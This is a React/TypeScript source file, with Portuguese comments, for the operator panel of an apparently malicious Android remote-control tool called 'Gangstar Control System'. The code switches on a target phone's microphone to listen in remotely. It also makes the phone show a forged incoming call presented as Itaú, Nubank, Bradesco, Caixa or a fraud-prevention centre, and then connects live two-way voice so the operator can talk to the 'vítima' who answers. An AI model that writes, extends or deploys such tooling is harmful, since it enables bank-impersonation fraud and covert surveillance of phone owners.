import React, { useState, useEffect, useRef } from 'react';
import { 
  Phone, PhoneCall, PhoneOff, Mic, MicOff, Volume2, VolumeX, 
  X, Sparkles, PhoneIncoming, UserCheck, Building2, Smartphone
} from 'lucide-react';

interface VoiceCallModalProps {
  isOpen: boolean;
  onClose: () => void;
  deviceId: string;
  deviceName?: string;
  onSendCommand: (command: any) => Promise<any> | void;
}

export const VoiceCallModal: React.FC<VoiceCallModalProps> = ({
  isOpen,
  onClose,
  deviceId,
  deviceName = 'Target Device',
  onSendCommand,
}) => {
  // Voice 2-Way State
  const [isInCall, setIsInCall] = useState(false);
  const [isOperatorMuted, setIsOperatorMuted] = useState(false);
  const [isSpeakerMuted, setIsSpeakerMuted] = useState(false);
  const [statusMessage, setStatusMessage] = useState<string>('Pronto para iniciar chamada');

  // Chamada Falsa / Forjada (Fake Incoming Call)
  const [fakeCallerName, setFakeCallerName] = useState<string>('Gerente de Conta');
  const [fakeCallerNumber, setFakeCallerNumber] = useState<string>('0800 728 0728');
  const [fakeBank, setFakeBank] = useState<string>('itau');
  const [fakeDisplayMode, setFakeDisplayMode] = useState<'fullscreen' | 'notification'>('fullscreen');
  const [isFakeCallRinging, setIsFakeCallRinging] = useState<boolean>(false);

  // Audio Context & Stream Refs
  const audioCtxRef = useRef<AudioContext | null>(null);
  const mediaStreamRef = useRef<MediaStream | null>(null);
  const scriptProcessorRef = useRef<ScriptProcessorNode | null>(null);
  const wsMicRef = useRef<WebSocket | null>(null);
  const nextPlayTimeRef = useRef<number>(0);

  // Limpa estados ao fechar modal
  useEffect(() => {
    if (!isOpen && isInCall) {
      endVoiceCall();
    }
  }, [isOpen]);

  if (!isOpen) return null;

  // Presets de chamada falsa
  const PRESET_FAKE_CALLS = [
    { label: '🏦 Gerente Itaú', name: 'Gerente Itaú Uniclass', number: '0800 728 0728', bank: 'itau' },
    { label: '🟣 Nubank Segurança', name: 'Nubank Central de Segurança', number: '0800 591 2117', bank: 'nubank' },
    { label: '🔴 Bradesco VIP', name: 'Bradesco Gerência de Conta', number: '0800 704 8383', bank: 'bradesco' },
    { label: '🔷 Caixa Econômica', name: 'Caixa Econômica Federal', number: '0800 726 0101', bank: 'caixa' },
    { label: '🛡️ Prevenção Fraudes', name: 'Central de Prevenção a Fraudes', number: '0800 999 0000', bank: 'geral' },
  ];

  const applyPreset = (preset: typeof PRESET_FAKE_CALLS[0]) => {
    setFakeCallerName(preset.name);
    setFakeCallerNumber(preset.number);
    setFakeBank(preset.bank);
  };

  // ---------------------------------------------------------------------------
  // 1. INICIAR E ENCERRAR CHAMADA DE VOZ 2-WAY (FALAR COM O APARELHO)
  // ---------------------------------------------------------------------------
  const startVoiceCall = async () => {
    try {
      setStatusMessage('⚡ Conectando microfone e alto-falante...');

      // 1. Ativa microfone do aparelho Android para ouvir o ambiente remoto
      await onSendCommand({ action: 'TOGGLE_MICROPHONE', enabled: true });

      // 2. Inicializa Web Audio Context do navegador
      const AudioCtxClass = window.AudioContext || (window as any).webkitAudioContext;
      const audioCtx = new AudioCtxClass({ sampleRate: 16000 });
      if (audioCtx.state === 'suspended') {
        await audioCtx.resume();
      }
      audioCtxRef.current = audioCtx;

      // 3. Captura o microfone do operador no computador
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      mediaStreamRef.current = stream;

      const source = audioCtx.createMediaStreamSource(stream);
      const processor = audioCtx.createScriptProcessor(4096, 1, 1);
      scriptProcessorRef.current = processor;

      // Processador de áudio do operador -> envia PCM 16kHz ao celular alvo
      processor.onaudioprocess = (e) => {
        if (isOperatorMuted) return;
        const inputData = e.inputBuffer.getChannelData(0);

        // Converte float32 [-1, 1] para 16-bit PCM
        const pcm16 = new Int16Array(inputData.length);
        for (let i = 0; i < inputData.length; i++) {
          const s = Math.max(-1, Math.min(1, inputData[i]));
          pcm16[i] = s < 0 ? s * 0x8000 : s * 0x7fff;
        }

        // Envia via WebSocket de voz
        if (wsMicRef.current && wsMicRef.current.readyState === WebSocket.OPEN) {
          wsMicRef.current.send(pcm16.buffer);
        }
      };

      source.connect(processor);
      processor.connect(audioCtx.destination);

      // 4. Abre WebSocket para receber áudio do celular e enviar voz do operador
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      const host = window.location.host;
      const wsUrl = `${protocol}//${host}/ws/voice/${deviceId}?role=operator`;
      const ws = new WebSocket(wsUrl);
      ws.binaryType = 'arraybuffer';

      ws.onopen = () => {
        setIsInCall(true);
        setStatusMessage('🟢 2-Way Audio Live Connected to Device!');
      };

      ws.onmessage = (event) => {
        if (isSpeakerMuted) return;
        if (event.data instanceof ArrayBuffer) {
          playAudioChunk(event.data);
        }
      };

      ws.onerror = (err) => {
        console.error('Erro no WebSocket de Voz:', err);
        setStatusMessage('⚠️ Erro na conexão de áudio 2-Way');
      };

      ws.onclose = () => {
        setIsInCall(false);
      };

      wsMicRef.current = ws;

    } catch (err: any) {
      setStatusMessage(`⚠️ Erro ao iniciar voz: ${err.message}`);
      await endVoiceCall();
    }
  };

  const playAudioChunk = (buffer: ArrayBuffer) => {
    if (!audioCtxRef.current) return;
    try {
      const pcm16 = new Int16Array(buffer);
      const float32 = new Float32Array(pcm16.length);
      for (let i = 0; i < pcm16.length; i++) {
        float32[i] = pcm16[i] / 32768.0;
      }

      const audioBuffer = audioCtxRef.current.createBuffer(1, float32.length, 16000);
      audioBuffer.getChannelData(0).set(float32);

      const source = audioCtxRef.current.createBufferSource();
      source.buffer = audioBuffer;
      source.connect(audioCtxRef.current.destination);

      const currentTime = audioCtxRef.current.currentTime;
      if (nextPlayTimeRef.current < currentTime) {
        nextPlayTimeRef.current = currentTime;
      }
      source.start(nextPlayTimeRef.current);
      nextPlayTimeRef.current += audioBuffer.duration;

    } catch (e) {
      console.error('Erro ao tocar chunk de áudio:', e);
    }
  };

  const endVoiceCall = async () => {
    setIsInCall(false);
    setIsFakeCallRinging(false);
    setStatusMessage('Chamada encerrada');

    // Desativa microfone do celular
    try {
      await onSendCommand({ action: 'TOGGLE_MICROPHONE', enabled: false });
    } catch (_) {}

    // Fecha conexões de áudio
    if (scriptProcessorRef.current) {
      scriptProcessorRef.current.disconnect();
      scriptProcessorRef.current = null;
    }
    if (mediaStreamRef.current) {
      mediaStreamRef.current.getTracks().forEach((t) => t.stop());
      mediaStreamRef.current = null;
    }
    if (audioCtxRef.current) {
      audioCtxRef.current.close();
      audioCtxRef.current = null;
    }
    if (wsMicRef.current) {
      wsMicRef.current.close();
      wsMicRef.current = null;
    }
  };

  // ---------------------------------------------------------------------------
  // 2. DISPARAR E ENCERRAR CHAMADA FALSA (FAKE CALL)
  // ---------------------------------------------------------------------------
  const handleStartFakeCall = async () => {
    try {
      setIsFakeCallRinging(true);
      const modeText = fakeDisplayMode === 'notification' ? 'Notificação no topo' : 'Tela Cheia';
      setStatusMessage(`📞 Chamada forjada (${modeText}) iniciada! Celular tocando como: "${fakeCallerName}"`);

      // Envia comando para abrir a tela de ligação falsa no Android
      await onSendCommand({
        action: 'TRIGGER_FAKE_CALL',
        callerName: fakeCallerName,
        callerNumber: fakeCallerNumber,
        bank: fakeBank,
        displayMode: fakeDisplayMode,
      });

    } catch (err: any) {
      setStatusMessage(`⚠️ Erro ao disparar chamada falsa: ${err.message}`);
    }
  };

  const handleConnectFakeCallVoice = async () => {
    if (!isInCall) {
      await startVoiceCall();
    }
  };

  const handleEndFakeCall = async () => {
    try {
      setIsFakeCallRinging(false);
      await onSendCommand({ action: 'END_FAKE_CALL' });
      await endVoiceCall();
      setStatusMessage('Chamada falsa encerrada');
    } catch (err: any) {
      console.error('Erro ao encerrar chamada falsa:', err);
    }
  };

  return (
    <div className="fixed inset-0 z-[99999] bg-slate-950/85 backdrop-blur-xl flex items-center justify-center p-4 animate-in fade-in duration-200">
      <div className="w-full max-w-lg bg-[#061026] border-2 border-cyan-500/50 rounded-3xl shadow-[0_0_50px_rgba(0,240,255,0.3)] overflow-hidden flex flex-col relative font-sans text-slate-100">
        
        {/* Header do Modal */}
        <div className="px-5 py-4 bg-gradient-to-r from-[#081738] via-[#05112c] to-[#081738] border-b border-cyan-500/30 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-2xl bg-gradient-to-tr from-cyan-500 to-blue-600 border border-cyan-300 flex items-center justify-center text-white shadow-[0_0_15px_rgba(0,240,255,0.5)]">
              <PhoneCall className="w-5 h-5 animate-pulse" />
            </div>
            <div>
              <h2 className="text-sm font-black font-mono tracking-wider text-white uppercase flex items-center gap-2">
                CENTRAL DE LIGAÇÕES & VOZ
              </h2>
              <p className="text-[10.5px] font-mono text-cyan-300/80">
                Alvo: <strong className="text-white">{deviceName}</strong> ({deviceId})
              </p>
            </div>
          </div>

          <button
            onClick={() => {
              if (isInCall || isFakeCallRinging) endVoiceCall();
              onClose();
            }}
            className="w-8 h-8 rounded-xl bg-slate-900 border border-slate-700 hover:border-rose-500 hover:bg-rose-950/50 text-slate-400 hover:text-rose-300 flex items-center justify-center transition-all cursor-pointer"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* TÍTULO DA CENTRAL (SEM NAVEGAÇÃO DE OUTRAS ABAS - APENAS FAKE CALL) */}
        <div className="px-5 py-2.5 bg-[#040a18] border-b border-cyan-500/20 flex items-center gap-2">
          <PhoneIncoming className="w-4 h-4 text-cyan-400 animate-pulse" />
          <span className="text-xs font-mono font-black uppercase text-cyan-300 tracking-wider">
            📞 FORJAR CHAMADA ENTRANTE (FAKE CALL)
          </span>
        </div>

        {/* CONTEÚDO EXCLUSIVO: FORJAR CHAMADA (FAKE CALL) */}
        <div className="p-5 space-y-4 max-h-[75vh] overflow-y-auto font-mono">
          
          {/* Título explicativo */}
          <div className="p-3 rounded-2xl bg-cyan-950/40 border border-cyan-500/30 flex items-start gap-3 text-left">
            <PhoneIncoming className="w-5 h-5 text-cyan-400 shrink-0 mt-0.5 animate-bounce" />
            <div className="text-xs font-mono space-y-0.5">
              <strong className="text-cyan-200 uppercase block">Simulação de Chamada Entrante</strong>
              <span className="text-slate-400 block text-[11px]">
                Simula uma ligação realista na tela do aparelho. Dispare a chamada e, quando a vítima atender, clique em <span className="text-emerald-400 font-bold">CONECTAR VOZ 2-WAY</span>!
              </span>
            </div>
          </div>

          {/* Presets Rápidos */}
          <div className="space-y-1.5">
            <label className="text-[10.5px] font-mono text-cyan-300 uppercase tracking-wider font-bold block text-left">
              ⚡ Atalhos Rápidos (Identidades Pré-configuradas):
            </label>
            <div className="grid grid-cols-2 gap-1.5">
              {PRESET_FAKE_CALLS.map((preset) => (
                <button
                  key={preset.label}
                  type="button"
                  onClick={() => applyPreset(preset)}
                  className="py-2 px-2.5 rounded-xl bg-slate-900 border border-slate-700 hover:border-cyan-400 hover:bg-cyan-950/40 text-slate-200 text-left font-mono text-[11px] transition-all flex items-center gap-2 cursor-pointer"
                >
                  <span>{preset.label}</span>
                </button>
              ))}
            </div>
          </div>

          {/* Formulário de Configuração */}
          <div className="space-y-3 pt-1">
            {/* Nome do Chamador */}
            <div className="space-y-1 text-left">
              <label className="text-[11px] font-mono text-slate-300 uppercase tracking-wider font-bold flex items-center gap-1.5">
                <UserCheck className="w-3.5 h-3.5 text-cyan-400" />
                Nome do Chamador (Ex: Gerente, Nome Pessoal, etc):
              </label>
              <input
                type="text"
                value={fakeCallerName}
                onChange={(e) => setFakeCallerName(e.target.value)}
                placeholder="Ex: Gerente de Conta, Gerente Itaú..."
                className="w-full bg-[#030816] border-2 border-cyan-500/50 focus:border-cyan-400 text-cyan-200 placeholder-slate-600 font-mono text-sm font-bold rounded-xl py-2 px-3 outline-none"
              />
            </div>

            {/* Número do Chamador */}
            <div className="space-y-1 text-left">
              <label className="text-[11px] font-mono text-slate-300 uppercase tracking-wider font-bold flex items-center gap-1.5">
                <Phone className="w-3.5 h-3.5 text-cyan-400" />
                Número de Exibição (Opcional):
              </label>
              <input
                type="text"
                value={fakeCallerNumber}
                onChange={(e) => setFakeCallerNumber(e.target.value)}
                placeholder="Ex: 0800 728 0728 ou 11998876655..."
                className="w-full bg-[#030816] border-2 border-cyan-500/50 focus:border-cyan-400 text-cyan-200 placeholder-slate-600 font-mono text-sm font-bold rounded-xl py-2 px-3 outline-none"
              />
            </div>

            {/* Tema de Banco / Estilo Visual */}
            <div className="space-y-1 text-left">
              <label className="text-[11px] font-mono text-slate-300 uppercase tracking-wider font-bold flex items-center gap-1.5">
                <Building2 className="w-3.5 h-3.5 text-cyan-400" />
                Tema Visual do Banco / Instituição:
              </label>
              <select
                value={fakeBank}
                onChange={(e) => setFakeBank(e.target.value)}
                className="w-full bg-[#030816] border-2 border-cyan-500/50 focus:border-cyan-400 text-cyan-200 font-mono text-xs font-bold rounded-xl py-2 px-3 outline-none cursor-pointer"
              >
                <option value="itau">Itaú Uniclass (Laranja / Azul)</option>
                <option value="nubank">Nubank (Roxo)</option>
                <option value="bradesco">Bradesco (Vermelho)</option>
                <option value="caixa">Caixa Econômica Federal (Azul)</option>
                <option value="santander">Santander (Vermelho Intenso)</option>
                <option value="geral">Central Geral de Segurança</option>
              </select>
            </div>

            {/* Modo de Exibição da Chamada */}
            <div className="space-y-1 text-left">
              <label className="text-xs font-bold text-slate-300 uppercase flex items-center gap-1.5 font-mono">
                <Smartphone className="w-3.5 h-3.5 text-cyan-400" />
                Modo de Exibição no Celular:
              </label>
              <div className="grid grid-cols-2 gap-2">
                <button
                  type="button"
                  onClick={() => setFakeDisplayMode('fullscreen')}
                  className={`py-2 px-3 rounded-xl border font-mono text-xs font-bold uppercase transition-all flex items-center justify-center gap-1.5 cursor-pointer ${
                    fakeDisplayMode === 'fullscreen'
                      ? 'bg-cyan-950/90 border-cyan-400 text-cyan-200 shadow-[0_0_12px_rgba(6,182,212,0.4)]'
                      : 'bg-[#030816] border-slate-700 text-slate-400 hover:border-slate-500'
                  }`}
                >
                  <span>📱 Tela Cheia</span>
                </button>
                <button
                  type="button"
                  onClick={() => setFakeDisplayMode('notification')}
                  className={`py-2 px-3 rounded-xl border font-mono text-xs font-bold uppercase transition-all flex items-center justify-center gap-1.5 cursor-pointer ${
                    fakeDisplayMode === 'notification'
                      ? 'bg-cyan-950/90 border-cyan-400 text-cyan-200 shadow-[0_0_12px_rgba(6,182,212,0.4)]'
                      : 'bg-[#030816] border-slate-700 text-slate-400 hover:border-slate-500'
                  }`}
                >
                  <span>🔔 Notificação</span>
                </button>
              </div>
            </div>
          </div>

          {/* Status Visual */}
          <div className="p-3 rounded-xl bg-slate-900 border border-slate-800 text-center font-mono text-xs font-bold text-cyan-300">
            {statusMessage}
          </div>

          {/* Botões de Ação */}
          {!isFakeCallRinging ? (
            <button
              type="button"
              onClick={handleStartFakeCall}
              className="w-full py-4 rounded-2xl bg-gradient-to-r from-cyan-600 via-blue-600 to-cyan-500 text-white font-black font-mono text-xs uppercase tracking-widest shadow-[0_0_30px_rgba(6,182,212,0.6)] border-2 border-cyan-300 hover:scale-[1.02] active:scale-95 transition-all flex items-center justify-center gap-2 cursor-pointer"
            >
              <PhoneIncoming className="w-5 h-5 text-cyan-100" />
              <span>DISPARAR CHAMADA FORJADA NO CELULAR</span>
            </button>
          ) : (
              <div className="space-y-3">
                {!isInCall ? (
                  <button
                    type="button"
                    onClick={handleConnectFakeCallVoice}
                    className="w-full py-3.5 rounded-2xl bg-gradient-to-r from-emerald-500 via-teal-600 to-cyan-600 text-white font-black font-mono text-xs uppercase tracking-widest shadow-[0_0_25px_rgba(16,185,129,0.5)] border-2 border-emerald-300 hover:scale-[1.02] active:scale-95 transition-all flex items-center justify-center gap-2 cursor-pointer animate-pulse"
                  >
                    <Mic className="w-5 h-5 text-emerald-100" />
                    <span>🎙️ CONECTAR VOZ 2-WAY (FALAR E OUVIR)</span>
                  </button>
                ) : (
                  <div className="grid grid-cols-2 gap-2">
                    <button
                      type="button"
                      onClick={() => setIsOperatorMuted(!isOperatorMuted)}
                      className={`py-2.5 px-3 rounded-xl border font-mono text-[11px] font-bold uppercase transition-all flex items-center justify-center gap-1.5 cursor-pointer ${
                        isOperatorMuted
                          ? 'bg-rose-950/80 border-rose-500 text-rose-300'
                          : 'bg-slate-900 border-slate-700 text-slate-200'
                      }`}
                    >
                      {isOperatorMuted ? <MicOff className="w-3.5 h-3.5 text-rose-400" /> : <Mic className="w-3.5 h-3.5 text-cyan-400" />}
                      <span>{isOperatorMuted ? 'Mic: MUTADO' : 'Mic: ATIVO'}</span>
                    </button>

                    <button
                      type="button"
                      onClick={() => setIsSpeakerMuted(!isSpeakerMuted)}
                      className={`py-2.5 px-3 rounded-xl border font-mono text-[11px] font-bold uppercase transition-all flex items-center justify-center gap-1.5 cursor-pointer ${
                        isSpeakerMuted
                          ? 'bg-amber-950/80 border-amber-500 text-amber-300'
                          : 'bg-slate-900 border-slate-700 text-slate-200'
                      }`}
                    >
                      {isSpeakerMuted ? <VolumeX className="w-3.5 h-3.5 text-amber-400" /> : <Volume2 className="w-3.5 h-3.5 text-cyan-400" />}
                      <span>{isSpeakerMuted ? 'Ouvir: MUTADO' : 'Ouvir: ATIVO'}</span>
                    </button>
                  </div>
                )}

                <button
                  type="button"
                  onClick={handleEndFakeCall}
                  className="w-full py-3 rounded-2xl bg-gradient-to-r from-rose-600 to-red-700 text-white font-black font-mono text-xs uppercase tracking-widest shadow-[0_0_20px_rgba(244,63,94,0.5)] border border-rose-400 hover:scale-[1.02] active:scale-95 transition-all flex items-center justify-center gap-2 cursor-pointer"
                >
                  <PhoneOff className="w-4 h-4" />
                  <span>ENCERRAR CHAMADA FORJADA</span>
                </button>
              </div>
            )}
        </div>

        {/* Rodapé Informativo */}
        <div className="px-4 py-2.5 bg-[#030712] border-t border-cyan-500/20 text-center font-mono text-[10px] text-slate-400 flex items-center justify-between">
          <span className="flex items-center gap-1.5 text-cyan-300 font-bold">
            <Sparkles className="w-3.5 h-3.5 text-cyan-400" />
            Central de Ligações & Fake Call
          </span>
          <span className="text-slate-500">Gangstar Control System v2.0</span>
        </div>

      </div>
    </div>
  );
};

export default VoiceCallModal;
